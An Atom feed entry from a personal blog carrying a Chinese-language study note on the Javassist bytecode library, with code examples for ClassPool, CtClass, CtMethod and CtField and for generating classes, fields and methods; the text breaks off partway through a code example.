<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>clown</title>
  
  <subtitle>clown的站点</subtitle>
  <link href="https://clowsman.github.io/atom.xml" rel="self"/>
  
  <link href="https://clowsman.github.io/"/>
  <updated>2024-09-07T09:56:25.699Z</updated>
  <id>https://clowsman.github.io/</id>
  
  <author>
    <name>clown</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>javassist学习</title>
    <link href="https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-05T15:35:52.000Z</published>
    <updated>2024-09-07T09:56:25.699Z</updated>
    
    <content type="html"><![CDATA[<p>因为看到在缩短payload的时候会用到，赶紧来学习一下，参考文章：<a href="https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/">https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</a></p><p>这是官方文档：<a href="http://www.javassist.org/tutorial/tutorial.html">http://www.javassist.org/tutorial/tutorial.html</a></p><h1><span id="javassist介绍">javassist介绍</span></h1><p>Javassist 是一个开源的分析、编辑和创建Java字节码的类库.；其主要优点在于简单快速. 直接使用 java 编码的形式, 而不需要了解虚拟机指令, 就能动态改变类的结构, 或者动态生成类。</p><p>使用前导入jar包</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Javassist中最为重要的是<code>ClassPool</code>,<code>CtClass</code>, <code>CtMethod</code>以及<code>CtField</code>这几个类.</p><ul><li><code>ClassPool</code>: 一个基于<code>Hashtable</code>实现的<code>CtClass</code>对象容器, 其中键是类名称, 值是表示该类的<code>CtClass</code>对象</li><li><code>CtClass</code>: <code>CtClass</code>表示类, 一个<code>CtClass</code>(编译时类)对象可以处理一个class文件, 这些<code>CtClass</code>对象可以从<code>ClassPool</code>获得</li><li><code>CtMethod</code>: 表示类中的方法</li><li><code>CtField</code>: 表示类中的字段</li><li><code>CtConstructor</code>:可读写的类构造方法对象</li></ul><h1><span id="classpool相关方法">ClassPool相关方法</span></h1><ul><li><code>getDefault</code>: 返回默认的<code>ClassPool</code>是单例模式的，一般通过该方法创建我们的<code>ClassPool</code>；</li><li><code>appendClassPath</code>, <code>insertClassPath</code> : 将一个<code>ClassPath</code>加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；</li><li><code>toClass</code> : 将修改后的<code>CtClass</code>加载至当前线程的上下文类加载器中，<code>CtClass</code>的<code>toClass</code>方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；</li><li><code>get</code> , <code>getCtClass</code>: 根据类路径名获取该类的<code>CtClass</code>对象，用于后续的编辑。</li></ul><p>ClassPool对象的创建</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取ClassPool对象, 使用系统默认类路径</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 效果与 new ClassPool(true) 一致，只不过返回的是默认的单例模式</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br></code></pre></td></tr></table></figure><p>为减少ClassPool可能导致的内存消耗； 可以从ClassPool中删除不必要的CtClass对象. 或者每次创建新的ClassPool对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 从ClassPool中删除CtClass对象</span><br>ctClass.detach();<br><span class="hljs-comment">// 也可以每次创建一个新的ClassPool, 而不是ClassPool.getDefault(), 避免内存溢出</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><h1><span id="ctclass相关方法">CtClass相关方法</span></h1><ul><li>freeze: 冻结一个类，使其不可修改；</li><li>isFrozen : 判断一个类是否已被冻结；</li><li>prune : 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；</li><li>defrost : 解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用 prune 方法；</li><li>detach : 将该class从ClassPool中删除；</li><li>writeFile : 根据CtClass生成 .class 文件；</li><li>toClass : 通过类加载器加载该CtClass。</li><li>setInterfaces: 添加父接口</li><li>setSuperclass: 添加父类</li></ul><h2><span id="获取ctclass">获取CtClass</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<span class="hljs-comment">//未获取到类或抛异常</span><br><span class="hljs-comment">// 通过类名获取 CtClass, 未找到返回 null, 不会抛出异常</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass1</span> <span class="hljs-operator">=</span> pool.getOrNull(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br>ctClass.freeze();<span class="hljs-comment">//冻结类，即不能修改</span><br>System.out.println(ctClass.isFrozen());<span class="hljs-comment">//检查是否冻结，即不可修改</span><br></code></pre></td></tr></table></figure><h2><span id="创建ctclass">创建CtClass</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 复制一个类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass2</span> <span class="hljs-operator">=</span> pool.getAndRename(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>, <span class="hljs-string">&quot;org.clown.ssist.Teacher&quot;</span>);<br><span class="hljs-comment">// 创建一个新类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass3</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br><span class="hljs-comment">// 通过class文件创建一个新类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass4</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;target/classes/org/clown/ssist/Student.class&quot;</span>)));<br></code></pre></td></tr></table></figure><p>创建一个类然后写入</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建新类并写入</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071508005.png" alt="image-20240907150758908"></p><p>然后就会根据名称保存到对应的目录下，将类持久化了到文件中</p><h2><span id="ctclass基础信息">CtClass基础信息</span></h2><p>就是一些类的各种基础信息，类全名、类方法、类字段等</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 类名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">simpleName</span> <span class="hljs-operator">=</span> ctClass.getSimpleName();<br><span class="hljs-comment">// 类全名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ctClass.getName();<br><span class="hljs-comment">// 包名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">packageName</span> <span class="hljs-operator">=</span> ctClass.getPackageName();<br><span class="hljs-comment">// 接口</span><br>CtClass[] interfaces = ctClass.getInterfaces();<br><span class="hljs-comment">// 继承类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">superclass</span> <span class="hljs-operator">=</span> ctClass.getSuperclass();<br><span class="hljs-comment">// 获取类方法</span><br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;getName()&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;pool.get(String.class.getName()), pool.get(String.class.getName())&#125;);<br><span class="hljs-comment">// 获取类字段</span><br><span class="hljs-type">CtField</span> <span class="hljs-variable">ctField</span> <span class="hljs-operator">=</span> ctClass.getField(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">// 判断数组类型</span><br>ctClass.isArray();<br><span class="hljs-comment">// 判断原生类型</span><br>ctClass.isPrimitive();<br><span class="hljs-comment">// 判断接口类型</span><br>ctClass.isInterface();<br><span class="hljs-comment">// 判断枚举类型</span><br>ctClass.isEnum();<br><span class="hljs-comment">// 判断注解类型</span><br>ctClass.isAnnotation();<br><span class="hljs-comment">// 冻结一个类，使其不可修改</span><br>ctClass.freeze () <br><span class="hljs-comment">// 判断一个类是否已被冻结</span><br>ctClass.isFrozen()<br><span class="hljs-comment">// 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用</span><br>ctClass.prune() <br><span class="hljs-comment">//解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用prune方法</span><br>ctClass.defrost()<br></code></pre></td></tr></table></figure><h2><span id="对ctclass进行操作">对CtClass进行操作</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 添加接口</span><br>ctClass.addInterface(...);<br><span class="hljs-comment">// 添加构造器</span><br>ctClass.addConstructor(...);<br><span class="hljs-comment">// 添加字段</span><br>ctClass.addField(...);<br><span class="hljs-comment">// 添加方法</span><br>ctClass.addMethod(...);<br></code></pre></td></tr></table></figure><h2><span id="ctclass编译">CtClass编译</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取字节码文件 需要注意的是一旦调用该方法，则无法继续修改已经被加载的class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> ctClass.toClass();<br><span class="hljs-comment">// 类的字节码文件</span><br><span class="hljs-type">ClassFile</span> <span class="hljs-variable">classFile</span> <span class="hljs-operator">=</span> ctClass.getClassFile();<br><span class="hljs-comment">// 编译成字节码文件, 使用当前线程上下文类加载器加载类, 如果类已存在或者编译失败将抛出异常</span><br><span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br></code></pre></td></tr></table></figure><h1><span id="ctmethod相关方法">CtMethod相关方法</span></h1><p><code>CtMthod</code>代表类中的某个方法，可以通过<code>CtClass</code>提供的API获取或者<code>CtNewMethod</code>新建，通过<code>CtMethod</code>对象可以实现对方法的修改。</p><p>CtNewMethod有点类似一个工具类，里面的方法都是静态方法，比如生成一个新的CtMethod</p><p><img src="https://cdn.clown2024.cn/202409060034713.png" alt="image-20240906003402632"></p><ul><li><p>insertBefore : 在方法的起始位置插入代码；</p></li><li><p>insterAfter : 在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；</p></li><li><p>insertAt : 在指定的位置插入代码；</p></li><li><p>setBody: 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除；</p></li><li><p>make : 创建一个新的方法，本质就是调用CtNewMethod#make</p><p><img src="https://cdn.clown2024.cn/202409060035377.png" alt="image-20240906003533328"></p></li></ul><h2><span id="ctmethod属性获取">CtMethod属性获取</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass5</span> <span class="hljs-operator">=</span> pool.get(TestService.class.getName());<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass5.getDeclaredMethod(<span class="hljs-string">&quot;selectOrder&quot;</span>);<br><span class="hljs-comment">// 方法名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> ctMethod.getName();<br><span class="hljs-comment">// 返回类型</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">returnType</span> <span class="hljs-operator">=</span> ctMethod.getReturnType();<br><span class="hljs-comment">// 方法参数, 通过此种方式得到方法参数列表</span><br><span class="hljs-comment">// 格式: com.kawa.TestService.getOrder(java.lang.String,java.util.List)</span><br>ctMethod.getLongName();<br><span class="hljs-comment">// 方法签名 格式: (Ljava/lang/String;Ljava/util/List;Lcom/test/Order;)Ljava/lang/Integer;</span><br>ctMethod.getSignature();<br><br><span class="hljs-comment">// 获取方法参数名称, 可以通过这种方式得到方法真实参数名称</span><br>List&lt;String&gt; argKeys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><span class="hljs-type">MethodInfo</span> <span class="hljs-variable">methodInfo</span> <span class="hljs-operator">=</span> ctMethod.getMethodInfo();<br><span class="hljs-type">CodeAttribute</span> <span class="hljs-variable">codeAttribute</span> <span class="hljs-operator">=</span> methodInfo.getCodeAttribute();<br><span class="hljs-type">LocalVariableAttribute</span> <span class="hljs-variable">attr</span> <span class="hljs-operator">=</span> (LocalVariableAttribute) codeAttribute.getAttribute(LocalVariableAttribute.tag);<br><span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> ctMethod.getParameterTypes().length;<br><span class="hljs-comment">// 非静态的成员函数的第一个参数是this</span><br><span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> Modifier.isStatic(ctMethod.getModifiers()) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> pos; i &lt; len; i++) &#123;<br>    argKeys.add(attr.variableName(i));<br>&#125;<br></code></pre></td></tr></table></figure><h2><span id="ctmethod方法体修改">CtMethod方法体修改</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 在方法体前插入代码块</span><br>ctMethod.insertBefore(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 在方法体后插入代码块</span><br>ctMethod.insertAfter(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 在某行 字节码 后插入代码块</span><br>ctMethod.insertAt(<span class="hljs-number">10</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 添加参数</span><br>ctMethod.addParameter(CtClass);<br><span class="hljs-comment">// 设置方法名</span><br>ctMethod.setName(<span class="hljs-string">&quot;newName&quot;</span>);<br><span class="hljs-comment">// 设置方法体 $0=this / $1,$2,$3... 代表方法参数</span><br>ctMethod.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br><span class="hljs-comment">//创建一个新的方法</span><br>ctMethod.make(<span class="hljs-string">&quot;kawa&quot;</span>,CtClass);<br></code></pre></td></tr></table></figure><h2><span id="异常块添加">异常块添加</span></h2><p>在方法中加入try catch块, 需要注意的是, 必须在插入的代码中, 加入return值$e代表异常信息.插入的代码片段必须以throw或return语句结束</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ...;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">etype</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;java.io.IOException&quot;</span>);<br>m.addCatch(<span class="hljs-string">&quot;&#123; System.out.println($e); throw $e; &#125;&quot;</span>, etype);<br><span class="hljs-comment">// 等同于添加如下代码: </span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// the original method body</span><br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    System.out.println(e);<br>    <span class="hljs-keyword">throw</span> e;<br>&#125;<br></code></pre></td></tr></table></figure><h1><span id="类搜索路径">类搜索路径</span></h1><p>我们前面获取的ClassPool他有自己的类搜索路径，如果程序运行在JBoss或Tomcat等web服务器上，可能会找不到用户自己的类，我们需要手动添加一个类搜索路径。</p><p>下面是各种添加类搜素路径的各种方式</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过ClassClassPath添加路径*/</span><br><span class="hljs-comment">// 将classpath插入到指定classpath之前</span><br>pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Student.getClass()));<br><span class="hljs-comment">// 将classpath添加到指定classpath之后</span><br>pool.appendClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(<span class="hljs-built_in">this</span>.getClass()));<br></code></pre></td></tr></table></figure><blockquote><p>该方式添加的时候，比如上面的Student.class，可以将class所在的整个jar添加到搜索路径</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*指定目录添加搜索路径*/</span><br><span class="hljs-comment">// 将一个目录作为classpath</span><br>pool.insertClassPath(<span class="hljs-string">&quot;/xxx/lib&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过url指定搜索路径*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">ClassPath</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassPath</span>(<span class="hljs-string">&quot;www.sample.com&quot;</span>, <span class="hljs-number">80</span>, <span class="hljs-string">&quot;/out/&quot;</span>, <span class="hljs-string">&quot;com.test&quot;</span>);<br>pool.insertClassPath(cp);<br></code></pre></td></tr></table></figure><blockquote><p>上述代码将<a href="http://www.sample.com/out%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%B1%BB%E6%90%9C%E7%B4%A2%E8%B7%AF%E5%BE%84%E3%80%82%E5%B9%B6%E4%B8%94%E8%BF%99%E4%B8%AAURL%E5%8F%AA%E8%83%BD%E6%90%9C%E7%B4%A2%60com.test%60%E5%8C%85%E9%87%8C%E9%9D%A2%E7%9A%84%E7%B1%BB%E3%80%82">http://www.sample.com:80/out添加到类搜索路径。并且这个URL只能搜索`com.test`包里面的类。</a></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过ByteArrayPath添加搜索路径*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">byte</span>[] buf = 字节数组;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> 类名;<br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayClassPath</span>(name, buf));<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.get(name);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过输入流加载class*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span>  class文件对应的输入流;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.makeClass(ins);<br></code></pre></td></tr></table></figure><h1><span id="读写字节码">读写字节码</span></h1><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;test.Rectangle&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p><code>ClassPool</code>的<code>getDefault()</code>方法将会查找系统默认的路径来搜索<code>test.Rectable</code>对象，然后将获取到的<code>CtClass</code>对象赋值给cc变量，如果对象没有被找到，那么<code>get()</code>方法就会创建出一个默认的<code>CtClass</code>对象，然后放入到<code>HashTable</code>中，同时将当前创建的对象返回。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] b = cc.toBytecode(); <span class="hljs-comment">//直接获取字节码</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cc.toClass(); <span class="hljs-comment">//获取Class</span><br></code></pre></td></tr></table></figure><p><code>toClass()</code>方法调用使得当前线程中的context class loader加载此CtClass类，然后生成<code>java.lang.Class</code>对象。</p><h1><span id="对类的相关操作">对类的相关操作</span></h1><p>主要还是学一下具体的使用，太深入的东西先不看，参考文章：<a href="https://blog.csdn.net/weixin_54902210/article/details/129562446">https://blog.csdn.net/weixin_54902210/article/details/129562446</a></p><p>这里基于前面创建的Hello类进行操作</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><h2><span id="添加属性">添加属性</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtField;<br><span class="hljs-keyword">import</span> javassist.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071630618.png" alt="image-20240907163059547"></p><p>赋值也可以这样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ctClass.addField(name,<span class="hljs-string">&quot;name=\&quot;Sentiment\&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><p>但这种赋值偏向于用构造器等进行初始化</p><h2><span id="添加方法">添加方法</span></h2><p>方法可以设置的返回类型</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass booleanType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass charType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass byteType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass shortType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass intType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass longType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass floatType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass doubleType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass voidType;<br></code></pre></td></tr></table></figure><p>这里不支持直接用String，是因为在java字节码中，参数和返回类型的String一般都是用常量池中字符串的索引值，要设置String类型的话就和前面一样用<strong>classPool.getCtClass(“java.lang.String”)</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br><br>        <span class="hljs-comment">//3.添加方法</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//分别是返回类型，方法名，方法参数，要添加的方法的CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置方法为public</span><br>        ctClass.addMethod(test);<br>        ctClass.writeFile();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071700312.png" alt="image-20240907170022235"></p><h3><span id="设置方法体">设置方法体</span></h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//3.添加方法</span><br>        <span 